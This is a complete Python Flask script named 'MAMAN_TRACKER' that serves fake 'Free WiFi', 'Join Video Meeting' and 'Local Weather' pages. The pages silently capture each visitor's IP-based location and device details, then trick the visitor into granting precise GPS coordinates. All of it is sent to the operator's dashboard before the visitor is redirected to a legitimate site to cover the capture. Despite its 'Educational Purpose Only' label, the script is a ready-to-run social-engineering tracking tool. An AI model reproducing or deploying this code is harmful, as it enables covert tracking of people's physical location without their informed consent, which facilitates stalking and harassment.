#!/usr/bin/env python3
"""
MAMAN_TRACKER  - Dual-Layer Location Tracking
IP Geolocation (Automatic) + GPS Precise (Permission-based)
Educational Purpose Only
"""

from flask import Flask, request, render_template_string, jsonify
import json
from datetime import datetime

app = Flask(__name__)
locations = []

# Template with proper GPS trigger
TEMPLATE_WIFI = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi Available</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            text-align: center;
        }
        .wifi-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        h1 { color: #333; margin-bottom: 10px; font-size: 28px; }
        p { color: #666; margin-bottom: 30px; line-height: 1.6; }
        .btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(102,126,234,0.4); }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .loading {
            display: none;
            margin-top: 20px;
            color: #667eea;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="wifi-icon">📶</div>
        <h1>Free WiFi Access</h1>
        <p>Enable location to find and connect to the nearest free WiFi hotspot in your area.</p>
        <button class="btn" id="connectBtn">Connect to WiFi</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Finding nearby hotspots...</p>
        </div>
    </div>
    <script>
        var ipData = null;
        var gpsAttempted = false;
        
        // Step 1: Get IP location automatically (no permission)
        function getIPLocation() {
            fetch('https://ipapi.co/json/')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    ipData = data;
                    sendIPLocation(data);
                })
                .catch(function(error) {
                    console.log('IP lookup failed:', error);
                });
        }
        
        function sendIPLocation(data) {
            fetch('/capture_ip', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'ip_geolocation',
                    latitude: data.latitude,
                    longitude: data.longitude,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    ip: data.ip,
                    isp: data.org,
                    postal: data.postal,
                    timezone: data.timezone,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: screen.width + 'x' + screen.height
                })
            });
        }
        
        // Step 2: Get precise GPS location (requires permission)
        function getGPSLocation() {
            if (!navigator.geolocation) {
                alert('Geolocation not supported by your browser');
                redirectToHome();
                return;
            }
            
            gpsAttempted = true;
            document.getElementById('connectBtn').disabled = true;
            document.getElementById('loading').style.display = 'block';
            
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    // Success - GPS permission granted
                    var gpsData = {
                        type: 'gps_precise',
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        screen: screen.width + 'x' + screen.height,
                        ipData: ipData
                    };
                    
                    fetch('/capture_gps', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(gpsData)
                    }).then(function() {
                        setTimeout(function() {
                            alert('Connected! Enjoy your free WiFi.');
                            redirectToHome();
                        }, 1500);
                    });
                },
                function(error) {
                    // Error - GPS permission denied or failed
                    console.log('GPS Error:', error.message);
                    
                    // Log the denial
                    fetch('/capture_denied', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            error: error.message,
                            code: error.code,
                            timestamp: new Date().toISOString()
                        })
                    });
                    
                    setTimeout(function() {
                        alert('Using approximate location. Connecting to nearest hotspot...');
                        redirectToHome();
                    }, 1500);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }
        
        function redirectToHome() {
            window.location.href = 'https://www.google.com';
        }
        
        // Button click handler
        document.getElementById('connectBtn').addEventListener('click', function() {
            getGPSLocation();
        });
        
        // Auto-capture IP location on page load
        window.addEventListener('load', function() {
            getIPLocation();
        });
    </script>
</body>
</html>'''

TEMPLATE_MEET = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join Video Meeting</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #202124;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: #303134;
            padding: 40px;
            border-radius: 12px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 20px; }
        h1 { margin-bottom: 10px; font-size: 24px; }
        p { color: #9aa0a6; margin-bottom: 30px; line-height: 1.6; }
        .btn {
            width: 100%;
            padding: 16px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.3s;
        }
        .btn:hover { background: #1765cc; }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .loading {
            display: none;
            margin-top: 20px;
            color: #8ab4f8;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🎥</div>
        <h1>Join Video Meeting</h1>
        <p>To connect you to the nearest server for optimal quality, please enable location access.</p>
        <button class="btn" id="joinBtn">Join Meeting</button>
        <div class="loading" id="loading">Connecting to server...</div>
    </div>
    <script>
        var ipData = null;
        
        fetch('https://ipapi.co/json/')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                ipData = data;
                fetch('/capture_ip', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'ip_geolocation',
                        latitude: data.latitude,
                        longitude: data.longitude,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        ip: data.ip,
                        isp: data.org,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    })
                });
            });
        
        document.getElementById('joinBtn').addEventListener('click', function() {
            document.getElementById('joinBtn').disabled = true;
            document.getElementById('loading').style.display = 'block';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        fetch('/capture_gps', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                type: 'gps_precise',
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: new Date().toISOString(),
                                userAgent: navigator.userAgent,
                                ipData: ipData
                            })
                        }).then(function() {
                            setTimeout(function() {
                                window.location.href = 'https://meet.google.com';
                            }, 1500);
                        });
                    },
                    function(error) {
                        fetch('/capture_denied', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({error: error.message, code: error.code})
                        });
                        setTimeout(function() {
                            window.location.href = 'https://meet.google.com';
                        }, 1500);
                    },
                    {enableHighAccuracy: true, timeout: 15000, maximumAge: 0}
                );
            }
        });
    </script>
</body>
</html>'''

TEMPLATE_WEATHER = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Local Weather</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #2193b0 0%, #6dd5ed 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            padding: 50px;
            border-radius: 25px;
            box-shadow: 0 25px 70px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            text-align: center;
        }
        .weather-icon { font-size: 100px; margin-bottom: 20px; }
        h1 { color: #2c3e50; margin-bottom: 15px; font-size: 32px; }
        p { color: #555; margin-bottom: 35px; line-height: 1.7; }
        .btn {
            width: 100%;
            padding: 20px;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 18px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(245,87,108,0.4); }
        .btn:disabled { opacity: 0.6; }
        .loading { display: none; margin-top: 20px; color: #f5576c; }
    </style>
</head>
<body>
    <div class="container">
        <div class="weather-icon">🌤</div>
        <h1>Get Local Weather</h1>
        <p>Enable location to see accurate weather forecast for your exact location.</p>
        <button class="btn" id="weatherBtn">Show My Weather</button>
        <div class="loading" id="loading">Loading weather data...</div>
    </div>
    <script>
        var ipData = null;
        
        fetch('https://ipapi.co/json/')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                ipData = data;
                fetch('/capture_ip', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'ip_geolocation',
                        latitude: data.latitude,
                        longitude: data.longitude,
                        city: data.city,
                        ip: data.ip,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    })
                });
            });
        
        document.getElementById('weatherBtn').addEventListener('click', function() {
            document.getElementById('weatherBtn').disabled = true;
            document.getElementById('loading').style.display = 'block';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        fetch('/capture_gps', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                type: 'gps_precise',
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: new Date().toISOString(),
                                ipData: ipData
                            })
                        }).then(function() {
                            window.location.href = 'https://weather.com';
                        });
                    },
                    function(error) {
                        fetch('/capture_denied', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({error: error.message})
                        });
                        window.location.href = 'https://weather.com';
                    },
                    {enableHighAccuracy: true, timeout: 15000, maximumAge: 0}
                );
            }
        });
    </script>
</body>
</html>'''

TEMPLATES = {
    'wifi': TEMPLATE_WIFI,
    'meet': TEMPLATE_MEET,
    'weather': TEMPLATE_WEATHER
}

current_template = 'wifi'

@app.route('/')
def index():
    return render_template_string(TEMPLATES[current_template])

@app.route('/capture_ip', methods=['POST'])
def capture_ip():
    data = request.json
    data['source'] = 'IP Geolocation (Approximate)'
    data['accuracy_type'] = 'City-Level'
    data['user_ip'] = request.remote_addr
    data['captured_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    locations.append(data)
    
    print("\n" + "="*70)
    print("🌐 STEP 1: IP-BASED LOCATION CAPTURED (Automatic - No Permission)")
    print("="*70)
    print(f"📍 Location:  {data.get('city', 'Unknown')}, {data.get('region', 'Unknown')}, {data.get('country', 'Unknown')}")
    print(f"🌍 Coords:    {data.get('latitude', 'N/A')}, {data.get('longitude', 'N/A')}")
    print(f"🎯 Accuracy:  City-level (~10-50km radius)")
    print(f"🌐 IP:        {data.get('ip', 'Unknown')}")
    print(f"🏢 ISP:       {data.get('isp', 'Unknown')}")
    print(f"📮 Postal:    {data.get('postal', 'Unknown')}")
    print(f"🕐 Time:      {data['captured_at']}")
    print(f"📱 Platform:  {data.get('platform', 'Unknown')}")
    print(f"🗺  Maps:      https://www.google.com/maps?q={data.get('latitude', 0)},{data.get('longitude', 0)}")
    print(f"\n⏳ Status:    Waiting for user to click button for GPS...")
    print("="*70 + "\n")
    
    save_to_file()
    return jsonify({'status': 'success'})

@app.route('/capture_gps', methods=['POST'])
def capture_gps():
    data = request.json
    data['source'] = 'GPS Precise (Permission Granted)'
    data['accuracy_type'] = 'Meter-Level'
    data['user_ip'] = request.remote_addr
    data['captured_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    locations.append(data)
    
    print("\n" + "🎯"*35)
    print("🎯 STEP 2: PRECISE GPS LOCATION CAPTURED!")
    print("🎯"*35)
    print(f"✅ Permission: GRANTED BY USER")
    print(f"📍 Latitude:  {data['latitude']}")
    print(f"📍 Longitude: {data['longitude']}")
    print(f"🎯 Accuracy:  {data.get('accuracy', 'N/A')} meters (PRECISE!)")
    print(f"📏 Altitude:  {data.get('altitude', 'N/A')} meters")
    print(f"🚀 Speed:     {data.get('speed', 'N/A')} m/s")
    print(f"🧭 Heading:   {data.get('heading', 'N/A')} degrees")
    print(f"🌐 IP:        {data['user_ip']}")
    print(f"🕐 Time:      {data['captured_at']}")
    print(f"📱 Device:    {data.get('platform', 'Unknown')}")
    print(f"🗺  Maps:      https://www.google.com/maps?q={data['latitude']},{data['longitude']}")
    print("🎯"*35 + "\n")
    
    save_to_file()
    return jsonify({'status': 'success'})

@app.route('/capture_denied', methods=['POST'])
def capture_denied():
    data = request.json
    print("\n" + "⚠ "*35)
    print("⚠  GPS PERMISSION DENIED")
    print("⚠ "*35)
    print(f"❌ User denied GPS access")
    print(f"💡 But we still have IP location from Step 1!")
    print("⚠ "*35 + "\n")
    return jsonify({'status': 'logged'})

def save_to_file():
    with open('locations.json', 'w') as f:
        json.dump(locations, f, indent=2)

@app.route('/logs')
def view_logs():
    html = '''
    <html>
    <head>
        <title>Location Dashboard</title>
        <style>
            body { 
                font-family: 'Courier New', monospace; 
                padding: 30px; 
                background: #0d1117; 
                color: #c9d1d9; 
            }
            h1 { color: #58a6ff; margin-bottom: 10px; }
            .summary {
                background: #161b22;
                padding: 20px;
                border-radius: 8px;
                margin-bottom: 30px;
                border: 2px solid #58a6ff;
            }
            .summary h2 { color: #58a6ff; margin-bottom: 15px; font-size: 20px; }
            .stat { 
                display: inline-block; 
                margin: 10px 20px 10px 0; 
                padding: 10px 20px;
                background: #21262d;
                border-radius: 6px;
            }
            .stat-label { color: #8b949e; font-size: 12px; }
            .stat-value { color: #58a6ff; font-size: 24px; font-weight: bold; }
            .location { 
                background: #161b22; 
                padding: 20px; 
                margin: 15px 0; 
                border-radius: 8px; 
                border-left: 4px solid #58a6ff;
            }
            .gps { border-left-color: #3fb950; }
            .ip { border-left-color: #f85149; }
            .badge {
                display: inline-block;
                padding: 4px 12px;
                border-radius: 12px;
                font-size: 12px;
                font-weight: bold;
                margin-bottom: 10px;
            }
            .badge-gps { background: #3fb950; color: black; }
            .badge-ip { background: #f85149; color: white; }
            a { color: #58a6ff; text-decoration: none; }
            a:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <h1>📍 Location Tracking Dashboard</h1>
    '''
    
    total = len(locations)
    gps_count = sum(1 for loc in locations if 'GPS' in loc['source'])
    ip_count = sum(1 for loc in locations if 'IP' in loc['source'])
    
    html += f'''
        <div class="summary">
            <h2>📊 Capture Statistics</h2>
            <div class="stat">
                <div class="stat-label">Total Captures</div>
                <div class="stat-value">{total}</div>
            </div>
            <div class="stat">
                <div class="stat-label">🎯 GPS Precise</div>
                <div class="stat-value" style="color: #3fb950;">{gps_count}</div>
            </div>
            <div class="stat">
                <div class="stat-label">🌐 IP Approximate</div>
                <div class="stat-value" style="color: #f85149;">{ip_count}</div>
            </div>
            <div class="stat">
                <div class="stat-label">Success Rate</div>
                <div class="stat-value" style="color: #f0883e;">{int((gps_count/total*100) if total > 0 else 0)}%</div>
            </div>
        </div>
        <h2 style="color: #8b949e; margin-bottom: 20px;">Recent Captures ({total})</h2>
    '''
    
    for i, loc in enumerate(reversed(locations), 1):
        is_gps = 'GPS' in loc['source']
        badge_class = 'badge-gps' if is_gps else 'badge-ip'
        div_class = 'gps' if is_gps else 'ip'
        
        html += f'''
        <div class="location {div_class}">
            <span class="badge {badge_class}">{loc['source']}</span><br>
            <strong>Capture #{i}</strong><br>
            🌍 Coordinates: {loc.get('latitude', 'N/A')}, {loc.get('longitude', 'N/A')}<br>
        '''
        
        if is_gps:
            html += f"🎯 Accuracy: {loc.get('accuracy', 'N/A')} meters (PRECISE)<br>"
            html += f"📏 Altitude: {loc.get('altitude', 'N/A')} meters<br>"
            html += f"🚀 Speed: {loc.get('speed', 'N/A')} m/s<br>"
        else:
            html += f"📍 City: {loc.get('city', 'Unknown')}, {loc.get('region', 'Unknown')}<br>"
            html += f"🎯 Accuracy: City-level (~10-50km)<br>"
            html += f"🏢 ISP: {loc.get('isp', 'Unknown')}<br>"
        
        html += f'''
            🌐 IP: {loc.get('user_ip', loc.get('ip', 'Unknown'))}<br>
            🕐 Time: {loc['captured_at']}<br>
            <a href="https://www.google.com/maps?q={loc.get('latitude', 0)},{loc.get('longitude', 0)}" target="_blank">
                🗺 View on Google Maps
            </a>
        </div>
        '''
    
    if total == 0:
        html += '<p style="text-align: center; color: #8b949e; margin-top: 50px;">No locations captured yet.</p>'
    
    html += '</body></html>'
    return html

def print_banner():
    banner = """
    ╔═══════════════════════════════════════════════╗
    ║       MAMAN TRACKER  v1.0                     ║
    ║   Dual-Layer Location Tracking System         ║
    ║                                               ║
    ║   Layer 1: IP Auto-Capture (No Permission)    ║
    ║   Layer 2: GPS Precise (Button Trigger)       ║
    ║                                               ║
    ║        Educational Purpose Only               ║
    ╚═══════════════════════════════════════════════╝
    """
    print(banner)

def main():
    global current_template
    
    print_banner()
    
    print("\n[?] Select Social Engineering Template:")
    print("    1. Free WiFi Hotspot Finder (Recommended)")
    print("    2. Video Meeting Join")
    print("    3. Local Weather Forecast")
    
    choice = input("\n[>] Enter choice (1-3): ").strip()
    
    if choice == '2':
        current_template = 'meet'
    elif choice == '3':
        current_template = 'weather'
    else:
        current_template = 'wifi'
    
    port = input("\n[>] Enter port (default 8080): ").strip()
    port = int(port) if port else 8080
    
    print(f"\n{'='*60}")
    print(f"[+] Server Running: http://0.0.0.0:{port}")
    print(f"[+] Template: {current_template.upper()}")
    print(f"[+] Dashboard: http://0.0.0.0:{port}/logs")
    print(f"{'='*60}")
    print("\n[*] HOW IT WORKS:")
    print("    1. User visits link → IP location captured automatically")
    print("    2. User clicks button → GPS permission prompt appears")
    print("    3. If granted → Get precise GPS coordinates")
    print("    4. If denied → Still have IP-based location")
    print("\n[*] Press Ctrl+C to stop")
    print(f"{'='*60}\n")
    
    try:
        app.run(host='0.0.0.0', port=port, debug=False)
    except KeyboardInterrupt:
        print("\n\n[!] Shutting down...")
        print(f"[+] Total captures: {len(locations)}")
        print("[+] Data saved to: locations.json")

if __name__ == '__main__':
    main()